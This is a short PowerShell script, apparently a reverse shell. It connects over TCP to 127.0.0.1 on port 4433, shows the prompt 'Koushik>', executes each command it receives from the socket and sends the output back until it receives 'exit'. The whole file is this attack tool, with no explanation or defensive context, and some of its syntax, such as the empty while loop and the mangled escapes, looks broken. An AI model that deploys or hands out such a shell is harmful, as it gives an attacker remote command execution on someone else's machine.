$socket = new-object System.Net.sockets.TcpClient('127.0.0.1',4433);
if($socket -eq $null){exit 1}
$stream = $socket.GetStream();
$writer = new-object System.IO.streamWriter($stream);
$buffer = new-object System.Byte[] 1024;
$encoding = new-object System.Text.AsciiEncoding;
do{
    $writer.write("Koushik> ");
    $writer.Flush();
    $read = $null;
    while($stream.DataAvailable -or ($read = $stream.Read($buffer, 0, 1024)) -eq $null)
    $out = $encoding.GetString($buffer, 0, $read).Replace("'r'n","").Replace("'n","");
    if(!$out.equals("exit")){
        $out = $out.split(' ')
            $res = [string](&$out[0] $out[1..$out.length]);
        if($res -ne $null){ $writer.WriteLine($res)}
    }
}While (!$out.equals("exit"))
$writer.close();$socket.close();